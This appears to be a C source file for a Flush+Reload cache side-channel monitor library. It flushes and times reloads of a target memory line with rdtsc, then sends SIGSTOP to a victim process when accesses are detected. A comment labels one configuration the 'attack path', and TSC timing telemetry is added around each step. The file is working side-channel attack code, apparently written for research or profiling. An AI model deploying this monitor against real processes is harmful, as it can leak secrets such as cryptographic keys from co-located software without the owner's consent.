/*
 * fr_signal_profile.c - Flush+Reload monitor with signal timing telemetry.
 *
 * Build:
 *   gcc -O2 -shared -fPIC -o libfr_signal_profile.so fr_signal_profile.c
 *
 * This helper intentionally lives beside, rather than replacing, libfr.so.
 * It uses the same monitor pattern as fr_monitor_line_sigstop but records
 * TSC timestamps around hit detection and kill(SIGSTOP).
 */

#define _GNU_SOURCE

#include <errno.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

struct fr_step_timing {
    uint64_t start;
    uint64_t end;
    uint32_t reload_cycles;
};

struct fr_single_fr_timing {
    uint64_t flush_start;
    uint64_t flush_end;
    uint64_t pause_start;
    uint64_t pause_end;
    uint64_t reload_start;
    uint64_t reload_end;
    uint32_t reload_cycles;
};

struct fr_signal_profile {
    uint64_t monitor_start_tsc;
    uint64_t first_hit_tsc;
    uint64_t decision_tsc;
    uint64_t before_kill_tsc;
    uint64_t after_kill_tsc;
    uint64_t monitor_end_tsc;
    uint64_t sample_index;
    uint32_t best_cycles;
    uint32_t hit_cycles;
    uint32_t consecutive_hits;
    int32_t kill_rc;
    int32_t errno_value;
};

static inline uint64_t
frp_rdtsc_start(void)
{
    uint32_t lo, hi;
    __asm__ __volatile__(
        "lfence\n\t"
        "rdtsc"
        : "=a"(lo), "=d"(hi)
        :
        : "memory");
    return ((uint64_t)hi << 32) | lo;
}

static inline uint64_t
frp_rdtsc_end(void)
{
    uint32_t lo, hi, aux;
    __asm__ __volatile__(
        "rdtscp"
        : "=a"(lo), "=d"(hi), "=c"(aux)
        :
        : "memory");
    __asm__ __volatile__("lfence" ::: "memory");
    return ((uint64_t)hi << 32) | lo;
}

static inline void
frp_flush(void *addr)
{
    __asm__ __volatile__("clflush (%0)" : : "r"(addr) : "memory");
    __asm__ __volatile__("mfence" ::: "memory");
}

static inline uint32_t
frp_reload_time(void *addr)
{
    uint32_t lo0, hi0, lo1, hi1, aux;
    volatile uint8_t value;

    __asm__ __volatile__(
        "lfence\n\t"
        "rdtsc"
        : "=a"(lo0), "=d"(hi0)
        :
        : "memory");
    value = *(volatile uint8_t *)addr;
    (void)value;
    __asm__ __volatile__(
        "rdtscp"
        : "=a"(lo1), "=d"(hi1), "=c"(aux)
        :
        : "memory");
    __asm__ __volatile__("lfence" ::: "memory");
    return (uint32_t)((((uint64_t)hi1 << 32) | lo1) -
                      (((uint64_t)hi0 << 32) | lo0));
}

static inline void
frp_pause_loop(int pause_iters)
{
    for (int i = 0; i < pause_iters; i++) {
        __asm__ __volatile__("pause");
    }
}

uint64_t
fr_profile_line_sigstop_ex(
    void *addr,
    uint32_t threshold,
    uint64_t max_samples,
    int pause_iters,
    int min_consecutive,
    int pid,
    int sample_signal,
    long sample_delay_ns,
    struct fr_signal_profile *out);

uint64_t
fr_profile_line_sigstop(
    void *addr,
    uint32_t threshold,
    uint64_t max_samples,
    int pause_iters,
    int min_consecutive,
    int pid,
    int sample_signal,
    struct fr_signal_profile *out)
{
    return fr_profile_line_sigstop_ex(
        addr,
        threshold,
        max_samples,
        pause_iters,
        min_consecutive,
        pid,
        sample_signal,
        /* sample_delay_ns */ 0,
        out);
}

/*
 * Extended monitor: optional measurement-only sample_signal and delay before
 * SIGSTOP. Attack path uses sample_signal=0 and sample_delay_ns=0.
 */
uint64_t
fr_profile_line_sigstop_ex(
    void *addr,
    uint32_t threshold,
    uint64_t max_samples,
    int pause_iters,
    int min_consecutive,
    int pid,
    int sample_signal,
    long sample_delay_ns,
    struct fr_signal_profile *out)
{
    uint32_t best = UINT32_MAX;
    uint32_t consecutive = 0;
    uint64_t sample = 1;
    uint8_t unlimited = (max_samples == 0);

    if (out != NULL) {
        memset(out, 0, sizeof(*out));
        out->best_cycles = UINT32_MAX;
        out->kill_rc = -1;
        out->errno_value = 0;
        out->monitor_start_tsc = frp_rdtsc_start();
    }

    if (min_consecutive <= 0) {
        min_consecutive = 1;
    }
    if (sample_delay_ns < 0) {
        sample_delay_ns = 0;
    }

    while (unlimited || sample <= max_samples) {
        frp_flush(addr);
        if (pause_iters > 0) {
            frp_pause_loop(pause_iters);
        }

        uint32_t cycles = frp_reload_time(addr);
        uint64_t after_reload = frp_rdtsc_end();
        if (cycles < best) {
            best = cycles;
        }

        if (cycles <= threshold) {
            consecutive++;
            if (out != NULL && out->first_hit_tsc == 0) {
                out->first_hit_tsc = after_reload;
            }
            if (consecutive >= (uint32_t)min_consecutive) {
                int rc;

                if (out != NULL) {
                    out->decision_tsc = frp_rdtsc_end();
                    out->before_kill_tsc = frp_rdtsc_start();
                }
                errno = 0;
                if (sample_signal > 0) {
                    (void)kill(pid, sample_signal);
                    if (sample_delay_ns > 0) {
                        struct timespec delay = {
                            .tv_sec = sample_delay_ns / 1000000000L,
                            .tv_nsec = sample_delay_ns % 1000000000L,
                        };
                        (void)nanosleep(&delay, NULL);
                    }
                }
                rc = kill(pid, SIGSTOP);
                if (out != NULL) {
                    out->after_kill_tsc = frp_rdtsc_end();
                    out->monitor_end_tsc = out->after_kill_tsc;
                    out->sample_index = sample;
                    out->best_cycles = best;
                    out->hit_cycles = cycles;
                    out->consecutive_hits = consecutive;
                    out->kill_rc = rc;
                    out->errno_value = errno;
                }
                return sample;
            }
        }
        else {
            consecutive = 0;
        }
        sample++;
    }

    if (out != NULL) {
        out->monitor_end_tsc = frp_rdtsc_end();
        out->best_cycles = best;
    }
    return 0;
}

void
fr_time_flush(void *addr, struct fr_step_timing *out)
{
    if (out == NULL) {
        return;
    }
    out->reload_cycles = 0;
    out->start = frp_rdtsc_start();
    frp_flush(addr);
    out->end = frp_rdtsc_end();
}

void
fr_time_reload(void *addr, struct fr_step_timing *out)
{
    if (out == NULL) {
        return;
    }
    out->start = frp_rdtsc_start();
    out->reload_cycles = frp_reload_time(addr);
    out->end = frp_rdtsc_end();
}

void
fr_time_pause(int pause_iters, struct fr_step_timing *out)
{
    if (out == NULL) {
        return;
    }
    out->reload_cycles = 0;
    out->start = frp_rdtsc_start();
    if (pause_iters > 0) {
        frp_pause_loop(pause_iters);
    }
    out->end = frp_rdtsc_end();
}

void
fr_time_single_fr(void *addr, int pause_iters, struct fr_single_fr_timing *out)
{
    if (out == NULL) {
        return;
    }
    memset(out, 0, sizeof(*out));
    out->flush_start = frp_rdtsc_start();
    frp_flush(addr);
    out->flush_end = frp_rdtsc_end();
    out->pause_start = out->flush_end;
    if (pause_iters > 0) {
        frp_pause_loop(pause_iters);
    }
    out->pause_end = frp_rdtsc_end();
    out->reload_start = out->pause_end;
    out->reload_cycles = frp_reload_time(addr);
    out->reload_end = frp_rdtsc_end();
}

struct fr_kill_timing {
    uint64_t before_tsc;
    uint64_t after_tsc;
    int32_t kill_rc;
    int32_t errno_value;
    int32_t sig;
};

/*
 * RDTSC-bracketed kill(sig). Use for SIGSTOP or SIGCONT so both signals share
 * the same measurement method (no ptrace, no Python around the syscall).
 */
int
fr_time_kill(int pid, int sig, struct fr_kill_timing *out)
{
    int rc;

    if (out == NULL) {
        errno = 0;
        return kill(pid, sig);
    }
    memset(out, 0, sizeof(*out));
    out->sig = sig;
    out->before_tsc = frp_rdtsc_start();
    errno = 0;
    rc = kill(pid, sig);
    out->after_tsc = frp_rdtsc_end();
    out->kill_rc = rc;
    out->errno_value = errno;
    return rc;
}

uint64_t
cpu_freq_khz(void)
{
    FILE *f;
    char buf[256];

    f = fopen("/sys/devices/system/cpu/cpu0/tsc_freq_khz", "r");
    if (f) {
        uint64_t khz = 0;
        if (fscanf(f, "%lu", &khz) == 1 && khz > 0) {
            fclose(f);
            return khz;
        }
        fclose(f);
    }

    f = fopen("/proc/cpuinfo", "r");
    if (f) {
        while (fgets(buf, sizeof(buf), f)) {
            char *at = strstr(buf, "@ ");
            if (at) {
                double ghz = 0.0;
                if (sscanf(at + 2, "%lfGHz", &ghz) == 1 && ghz > 0) {
                    fclose(f);
                    return (uint64_t)(ghz * 1e6);
                }
            }
        }
        rewind(f);
        while (fgets(buf, sizeof(buf), f)) {
            double mhz = 0.0;
            if (sscanf(buf, "cpu MHz : %lf", &mhz) == 1 && mhz > 0) {
                fclose(f);
                return (uint64_t)(mhz * 1000.0);
            }
        }
        fclose(f);
    }

    return 0;
}
